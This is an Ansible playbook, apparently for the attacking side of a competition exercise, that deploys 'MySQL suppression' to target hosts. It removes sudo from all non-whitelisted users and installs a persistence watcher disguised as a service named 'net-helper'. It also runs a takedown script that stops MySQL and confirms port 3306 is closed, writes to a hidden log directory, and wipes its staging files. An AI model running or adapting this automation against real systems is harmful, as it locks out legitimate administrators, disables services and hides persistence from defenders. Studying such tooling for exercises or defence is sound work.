---
- name: Deploy MySQL Suppression to All Targets
  hosts: mysql_targets
  become: true
  gather_facts: true

  vars:
    whitelist_users:
      - greyteam
      - scoring
      - cia
      - kgb
    deploy_dir: /tmp/.deploy
    log_path: /var/lib/.cache/mysql_watch.log

  tasks:

    # ── Sanity check ──────────────────────────────────
    - name: Confirm we are on Ubuntu 22.04
      assert:
        that:
          - ansible_distribution == "Ubuntu"
          - ansible_distribution_version == "22.04"
        fail_msg: "Wrong OS — skipping {{ inventory_hostname }}"
        success_msg: "Confirmed Ubuntu 22.04 on {{ inventory_hostname }}"

    # ── Prep ──────────────────────────────────────────
    - name: Create deploy staging directory
      file:
        path: "{{ deploy_dir }}"
        state: directory
        mode: '0700'

    - name: Create log directory
      file:
        path: /var/lib/.cache
        state: directory
        mode: '0777'

    # ── Upload scripts ────────────────────────────────
    - name: Upload watcher installer
      copy:
        src: install_watcher.sh
        dest: "{{ deploy_dir }}/install_watcher.sh"
        mode: '0700'

    - name: Upload takedown script
      copy:
        src: mysql_takedown.sh
        dest: "{{ deploy_dir }}/mysql_takedown.sh"
        mode: '0700'

    # ── Whitelist enforcement ─────────────────────────
    - name: Get current sudo group members
      command: getent group sudo
      register: sudo_group
      changed_when: false

    - name: Parse sudo members into list
      set_fact:
        sudo_members: "{{ sudo_group.stdout.split(':')[3].split(',') \
                          | select('ne', '') | list }}"

    - name: Remove sudo from non-whitelisted users
      command: gpasswd -d {{ item }} sudo
      loop: "{{ sudo_members }}"
      when: item not in whitelist_users
      ignore_errors: true
      register: sudo_removal

    - name: Log sudo removals
      lineinfile:
        path: "{{ log_path }}"
        line: "[{{ ansible_date_time.iso8601 }}] Removed sudo from {{ item.item }}"
        create: true
      loop: "{{ sudo_removal.results }}"
      when: item.rc is defined and item.rc == 0

    # ── Install watcher (persistence) ─────────────────
    - name: Run watcher installer
      command: bash {{ deploy_dir }}/install_watcher.sh
      register: watcher_install

    - name: Show watcher install output
      debug:
        msg: "{{ watcher_install.stdout_lines }}"

    # ── Verify watcher is running ─────────────────────
    - name: Confirm net-helper service is active
      systemd:
        name: net-helper
      register: watcher_status

    - name: Assert watcher is running
      assert:
        that: watcher_status.status.ActiveState == "active"
        fail_msg: "WARNING — watcher not running on {{ inventory_hostname }}"
        success_msg: "Watcher confirmed running on {{ inventory_hostname }}"

    # ── MySQL takedown ────────────────────────────────
    - name: Run MySQL takedown
      command: bash {{ deploy_dir }}/mysql_takedown.sh
      register: takedown_result

    - name: Confirm MySQL is masked
      command: systemctl is-active mysql
      register: mysql_status
      failed_when: false
      changed_when: false

    - name: Report MySQL status
      debug:
        msg: >
          {{ inventory_hostname }} MySQL status:
          {{ mysql_status.stdout }}
          (should be 'inactive' or 'failed')

    # ── Verify port 3306 is closed ────────────────────
    - name: Check port 3306 is not listening
      command: ss -tlnp
      register: port_check
      changed_when: false

    - name: Assert 3306 is not open
      assert:
        that: "'3306' not in port_check.stdout"
        fail_msg: "WARNING — port 3306 still open on {{ inventory_hostname }}"
        success_msg: "Confirmed port 3306 closed on {{ inventory_hostname }}"

    # ── Cleanup staging files ─────────────────────────
    - name: Remove staging directory
      file:
        path: "{{ deploy_dir }}"
        state: absent

    # ── Final report ──────────────────────────────────
    - name: Final status summary
      debug:
        msg:
          - "Host     : {{ inventory_hostname }}"
          - "Watcher  : {{ watcher_status.status.ActiveState }}"
          - "MySQL    : {{ mysql_status.stdout }}"
          - "Port 3306: {{ '3306' not in port_check.stdout }}"